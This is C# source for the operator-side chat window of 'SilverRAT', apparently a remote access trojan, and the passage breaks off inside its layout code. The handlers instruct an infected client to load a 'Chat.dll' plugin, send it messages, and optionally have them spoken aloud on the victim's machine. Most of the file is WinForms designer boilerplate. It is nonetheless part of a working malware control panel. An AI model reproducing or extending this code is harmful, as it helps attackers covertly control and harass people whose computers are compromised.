using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Algorithm;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Chat : Form
{
    private string Nickname = "Admin";

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    private BunifuPages PageKeyloaggar;

    private TabPage PageOfflien;

    private ToolStripSeparator toolStripSeparator3;

    private ToolStripButton SentMessage;

    private ToolStripLabel toolStripLabel3;

    public ToolStripComboBox ComboxVoice;

    public RichTextBox RixhTextBox1;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private ToolStripSeparator toolStripSeparator2;

    public ToolStripTextBox TextSend;

    private PictureBox pictureBox2;

    private BunifuTextBox NicknameTx;

    public Guna2GradientButton StartChat;

    public Panel PanelLoagen;

    public ToolStrip TopTols;

    public ToolStrip BottomTols;

    private ToolStripLabel toolStripLabel1;

    public ToolStripComboBox CombexSound;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public Chat()
    {
        InitializeComponent();
        MinimumSize = base.Size;
        ComboxVoice.SelectedIndex = 1;
        CombexSound.SelectedIndex = 0;
        CombexSound.Enabled = false;
    }

    private void Chat_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            userIDClient.Split('\\');
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Chat_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "chatExit";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
        Close();
    }

    private void Chat_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    private void SentMessage_Click(object sender, EventArgs e)
    {
        if (!TextSend.Enabled || string.IsNullOrWhiteSpace(TextSend.Text))
        {
            return;
        }
        RixhTextBox1.SelectionColor = Color.Green;
        RixhTextBox1.AppendText("ME: \n");
        RixhTextBox1.SelectionColor = Color.Black;
        RixhTextBox1.AppendText(TextSend.Text + Environment.NewLine);
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "chatWriteInput";
        msgPack.ForcePathObject("Input").AsString = Nickname + ": \n";
        msgPack.ForcePathObject("Input2").AsString = TextSend.Text;
        if (ComboxVoice.SelectedIndex == 0)
        {
            msgPack.ForcePathObject("Speech").AsString = true.ToString();
            if (CombexSound.SelectedIndex == 0)
            {
                msgPack.ForcePathObject("VoiceGender").AsString = true.ToString();
            }
            else
            {
                msgPack.ForcePathObject("VoiceGender").AsString = false.ToString();
            }
        }
        else
        {
            msgPack.ForcePathObject("Speech").AsString = false.ToString();
        }
        ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        TextSend.Clear();
    }

    private void StartChat_Click(object sender, EventArgs e)
    {
        try
        {
            if (!string.IsNullOrEmpty(NicknameTx.Text))
            {
                Nickname = NicknameTx.Text;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plu_gin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Chat.dll");
            ThreadPool.QueueUserWorkItem(ParentClient.Send, msgPack.Encode2Bytes());
            StartChat.Enabled = false;
            LoaderConnect.Visible = true;
        }
        catch
        {
        }
    }

    private void TextSend_KeyDown(object sender, KeyEventArgs e)
    {
        try
        {
            if (e.KeyCode != Keys.Return)
            {
                return;
            }
            e.SuppressKeyPress = true;
            if (!TextSend.Enabled || string.IsNullOrWhiteSpace(TextSend.Text))
            {
                return;
            }
            RixhTextBox1.SelectionColor = Color.Green;
            RixhTextBox1.AppendText("ME: \n");
            RixhTextBox1.SelectionColor = Color.Black;
            RixhTextBox1.AppendText(TextSend.Text + Environment.NewLine);
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "chatWriteInput";
            msgPack.ForcePathObject("Input").AsString = Nickname + ": \n";
            msgPack.ForcePathObject("Input2").AsString = TextSend.Text;
            if (ComboxVoice.SelectedIndex == 0)
            {
                msgPack.ForcePathObject("Speech").AsString = true.ToString();
                if (CombexSound.SelectedIndex == 0)
                {
                    msgPack.ForcePathObject("VoiceGender").AsString = true.ToString();
                }
                else
                {
                    msgPack.ForcePathObject("VoiceGender").AsString = false.ToString();
                }
            }
            else
            {
                msgPack.ForcePathObject("Speech").AsString = false.ToString();
            }
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            TextSend.Clear();
        }
        catch
        {
        }
    }

    private void ComboxVoice_SelectedIndexChanged(object sender, EventArgs e)
    {
        if (ComboxVoice.SelectedIndex == 0)
        {
            CombexSound.Enabled = true;
        }
        else
        {
            CombexSound.Enabled = false;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Chat));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties1 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation1 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PanelLoagen = new System.Windows.Forms.Panel();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.NicknameTx = new Bunifu.UI.WinForms.BunifuTextBox();
        this.StartChat = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PageKeyloaggar = new Bunifu.UI.WinForms.BunifuPages();
        this.PageOfflien = new System.Windows.Forms.TabPage();
        this.BottomTols = new System.Windows.Forms.ToolStrip();
        this.TextSend = new System.Windows.Forms.ToolStripTextBox();
        this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
        this.SentMessage = new System.Windows.Forms.ToolStripButton();
        this.TopTols = new System.Windows.Forms.ToolStrip();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.toolStripLabel3 = new System.Windows.Forms.ToolStripLabel();
        this.ComboxVoice = new System.Windows.Forms.ToolStripComboBox();
        this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
        this.CombexSound = new System.Windows.Forms.ToolStripComboBox();
        this.RixhTextBox1 = new System.Windows.Forms.RichTextBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PanelLoagen.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
        this.PageKeyloaggar.SuspendLayout();
        this.PageOfflien.SuspendLayout();
        this.BottomTols.SuspendLayout();
        this.TopTols.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ImageLogo)).BeginInit();
        this.SuspendLayout();
        // 
        // FormElipse
        // 
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        // 
        // panelForm
        // 
        this.panelForm.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PanelLoagen);
        this.panelForm.Controls.Add(this.PageKeyloaggar);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(617, 537);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        // 
        // PanelLoagen
        // 
        this.PanelLoagen.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelLoagen.Controls.Add(this.pictureBox2);
        this.PanelLoagen.Controls.Add(this.NicknameTx);
        this.PanelLoagen.Controls.Add(this.StartChat);
        this.PanelLoagen.Location = new System.Drawing.Point(15, 112);
        this.PanelLoagen.Name = "PanelLoagen";
        this.PanelLoagen.Size = new System.Drawing.Size(586, 393);
        this.PanelLoagen.TabIndex = 5;
        // 
        // pictureBox2
        // 
        this.pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
        this.pictureBox2.Location = new System.Drawing.Point(89, 70);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(388, 113);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 687;
        this.pictureBox2.TabStop = false;
        // 
        // NicknameTx
        // 
        this.NicknameTx.AcceptsReturn = false;
        this.NicknameTx.AcceptsTab = false;
        this.NicknameTx.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.NicknameTx.AnimationSpeed = 200;
        this.NicknameTx.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.NicknameTx.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.NicknameTx.AutoSizeHeight = true;
        this.NicknameTx.BackColor = System.Drawing.Color.Transparent;
        this.NicknameTx.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("NicknameTx.BackgroundImage")));
        this.NicknameTx.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.NicknameTx.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.NicknameTx.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.NicknameTx.BorderColorIdle = System.Drawing.Color.Silver;
        this.NicknameTx.BorderRadius = 2;
        this.NicknameTx.BorderThickness = 1;
        this.NicknameTx.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.NicknameTx.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.NicknameTx.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.NicknameTx.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.NicknameTx.DefaultText = "";
        this.NicknameTx.FillColor = System.Drawing.Color.White;
        this.NicknameTx.HideSelection = true;
        this.NicknameTx.IconLeft = null;
        this.NicknameTx.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.NicknameTx.IconPadding = 3;
        this.NicknameTx.IconRight = null;
        this.NicknameTx.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.NicknameTx.Lines = new string[0];
        this.NicknameTx.Location = new System.Drawing.Point(89, 216);
        this.NicknameTx.MaxLength = 32767;
        this.NicknameTx.MinimumSize = new System.Drawing.Size(1, 1);
        this.NicknameTx.Modified = false;
        this.NicknameTx.Multiline = false;
        this.NicknameTx.Name = "NicknameTx";
        stateProperties1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties1.FillColor = System.Drawing.Color.Empty;
        stateProperties1.ForeColor = System.Drawing.Color.Empty;
        stateProperties1.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.NicknameTx.OnActiveState = stateProperties1;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.NicknameTx.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.NicknameTx.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.NicknameTx.OnIdleState = stateProperties4;
        this.NicknameTx.Padding = new System.Windows.Forms.Padding(3);
        this.NicknameTx.PasswordChar = '\0';
        this.NicknameTx.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.NicknameTx.PlaceholderText = "Nickname";
        this.NicknameTx.ReadOnly = false;
        this.NicknameTx.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.NicknameTx.SelectedText = "";
        this.NicknameTx.SelectionLength = 0;
        this.NicknameTx.SelectionStart = 0;
        this.NicknameTx.ShortcutsEnabled = true;
        this.NicknameTx.Size = new System.Drawing.Size(388, 28);
        this.NicknameTx.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.NicknameTx.TabIndex = 686;
        this.NicknameTx.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.NicknameTx.TextMarginBottom = 0;
        this.NicknameTx.TextMarginLeft = 3;
        this.NicknameTx.TextMarginTop = 1;
        this.NicknameTx.TextPlaceholder = "Nickname";
        this.NicknameTx.UseSystemPasswordChar = false;
        this.NicknameTx.WordWrap = true;
        // 
        // StartChat
        // 
        this.StartChat.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.StartChat.BackColor = System.Drawing.Color.White;
        this.StartChat.BorderRadius = 4;
        this.StartChat.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.StartChat.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.StartChat.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.StartChat.CheckedState.Parent = this.StartChat;
        this.StartChat.Cursor = System.Windows.Forms.Cursors.Hand;
        this.StartChat.CustomImages.Parent = this.StartChat;
        this.StartChat.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.StartChat.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.StartChat.Font = new System.Drawing.Font("Consolas", 9.25F, System.Drawing.FontStyle.Bold);
        this.StartChat.ForeColor = System.Drawing.Color.White;
        this.StartChat.HoverState.Parent = this.StartChat;
        this.StartChat.Location = new System.Drawing.Point(469, 352);
        this.StartChat.Name = "StartChat";
        this.StartChat.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
        this.StartChat.PressedDepth = 50;
        this.StartChat.ShadowDecoration.Parent = this.StartChat;
        this.StartChat.Size = new System.Drawing.Size(95, 26);
        this.StartChat.TabIndex = 685;
        this.StartChat.Text = "Login";
        this.StartChat.Click += new System.EventHandler(this.StartChat_Click);
        // 
        // PageKeyloaggar
        // 
        this.PageKeyloaggar.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageKeyloaggar.AllowTransitions = false;
        this.PageKeyloaggar.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PageKeyloaggar.Controls.Add(this.PageOfflien);
        this.PageKeyloaggar.Location = new System.Drawing.Point(16, 112);
        this.PageKeyloaggar.Multiline = true;
        this.PageKeyloaggar.Name = "PageKeyloaggar";
        this.PageKeyloaggar.Page = this.PageOfflien;
        this.PageKeyloaggar.PageIndex = 0;
        this.PageKeyloaggar.PageName = "PageOfflien";
        this.PageKeyloaggar.PageTitle = "Offlien";
        this.PageKeyloaggar.SelectedIndex = 0;
        this.PageKeyloaggar.Size = new System.Drawing.Size(585, 393);
        this.PageKeyloaggar.TabIndex = 601;
        animation1.AnimateOnlyDifferences = false;
        animation1.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.BlindCoeff")));
        animation1.LeafCoeff = 0F;
        animation1.MaxTime = 1F;
        animation1.MinTime = 0F;
        animation1.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicCoeff")));
        animation1.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicShift")));
        animation1.MosaicSize = 0;
        animation1.Padding = new System.Windows.Forms.Padding(0);
        animation1.RotateCoeff = 0F;
        animation1.RotateLimit = 0F;
        animation1.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.ScaleCoeff")));
        animation1.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.SlideCoeff")));
        animation1.TimeCoeff = 0F;
        animation1.TransparencyCoeff = 0F;
        this.PageKeyloaggar.Transition = animation1;
        this.PageKeyloaggar.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        // 
        // PageOfflien
        // 
        this.PageOfflien.Controls.Add(this.BottomTols);
        this.PageOfflien.Controls.Add(this.TopTols);
        this.PageOfflien.Controls.Add(this.RixhTextBox1);
        this.PageOfflien.Location = new System.Drawing.Point(4, 4);
        this.PageOfflien.Name = "PageOfflien";
        this.PageOfflien.Padding = new System.Windows.Forms.Padding(3);
        this.PageOfflien.Size = new System.Drawing.Size(577, 367);
        this.PageOfflien.TabIndex = 1;
        this.PageOfflien.Text = "Offlien";
        this.PageOfflien.UseVisualStyleBackColor = true;
        // 
        // BottomTols
        // 
        this.BottomTols.Dock = System.Windows.Forms.DockStyle.Bottom;
        this.BottomTols.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.BottomTols.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.TextSend,
            this.toolStripSeparator3,
            this.SentMessage});
        this.BottomTols.Location = new System.Drawing.Point(3, 339);
        this.BottomTols.Name = "BottomTols";
        this.BottomTols.Size = new System.Drawing.Size(571, 25);
        this.BottomTols.TabIndex = 4;
        this.BottomTols.Text = "toolStrip3";
        this.BottomTols.Visible = false;
        // 
        // TextSend
        // 
        this.TextSend.Font = new System.Drawing.Font("Microsoft YaHei UI", 9F);
        this.TextSend.Name = "TextSend";
        this.TextSend.Size = new System.Drawing.Size(450, 25);
        this.TextSend.KeyDown += new System.Windows.Forms.KeyEventHandler(this.TextSend_KeyDown);
        // 
        // toolStripSeparator3
        // 
        this.toolStripSeparator3.Name = "toolStripSeparator3";
        this.toolStripSeparator3.Size = new System.Drawing.Size(6, 25);
        // 
        // SentMessage
        // 
        this.SentMessage.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.SentMessage.ForeColor = System.Drawing.Color.Black;
        this.SentMessage.Image = ((System.Drawing.Image)(resources.GetObject("SentMessage.Image")));
        this.SentMessage.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.SentMessage.Name = "SentMessage";
        this.SentMessage.Size = new System.Drawing.Size(40, 22);
        this.SentMessage.Text = " Send";
        this.SentMessage.Click += new System.EventHandler(this.SentMessage_Click);
        // 
        // TopTols
        // 
        this.TopTols.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.TopTols.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripSeparator2,
            this.toolStripLabel3,
            this.ComboxVoice,
            this.toolStripLabel1,
            this.CombexSound});
        this.TopTols.Location = new System.Drawing.Point(3, 3);
        this.TopTols.Name = "TopTols";
        this.TopTols.Size = new System.Drawing.Size(571, 25);
        this.TopTols.TabIndex = 3;
        this.TopTols.Text = "toolStrip2";
        this.TopTols.Visible = false;
        // 
        // toolStripSeparator2
        // 
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(6, 25);
        // 
        // toolStripLabel3
        // 
        this.toolStripLabel3.Name = "toolStripLabel3";
        this.toolStripLabel3.Size = new System.Drawing.Size(185, 22);
        this.toolStripLabel3.Text = " Speak the message with a voice : ";
        // 
        // ComboxVoice
        // 
        this.ComboxVoice.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComboxVoice.Items.AddRange(new object[] {
            "Enabled",
            "Disabled"});
        this.ComboxVoice.Name = "ComboxVoice";
        this.ComboxVoice.Size = new System.Drawing.Size(121, 25);
        this.ComboxVoice.SelectedIndexChanged += new System.EventHandler(this.ComboxVoice_SelectedIndexChanged);
        // 
        // toolStripLabel1
        // 
        this.toolStripLabel1.Name = "toolStripLabel1";
        this.toolStripLabel1.Size = new System.Drawing.Size(41, 22);
        this.toolStripLabel1.Text = "Sound";
        // 
        // CombexSound
        // 
        this.CombexSound.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.CombexSound.Items.AddRange(new object[] {
            "Male",
            "Female"});
        this.CombexSound.Name = "CombexSound";
        this.CombexSound.Size = new System.Drawing.Size(121, 25);
        // 
        // RixhTextBox1
        // 
        this.RixhTextBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.RixhTextBox1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.RixhTextBox1.Location = new System.Drawing.Point(3, 31);
        this.RixhTextBox1.Name = "RixhTextBox1";
        this.RixhTextBox1.ReadOnly = true;
        this.RixhTextBox1.Size = new System.Drawing.Size(571, 305);
        this.RixhTextBox1.TabIndex = 2;
        this.RixhTextBox1.Tag = "";
        this.RixhTextBox1.Text = "";
        this.RixhTextBox1.Visible = false;
        // 
        // FormResizeBox1
        // 
        this.FormResizeBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(590, 511);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        // 
        // PanelTitle
        // 
        this.PanelTitle.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.PanelTitle.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelTitle.BackgroundImage")));
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(587, 77);
        this.PanelTitle.TabIndex = 596;
        // 
        // LoaderConnect
        // 
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5F;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
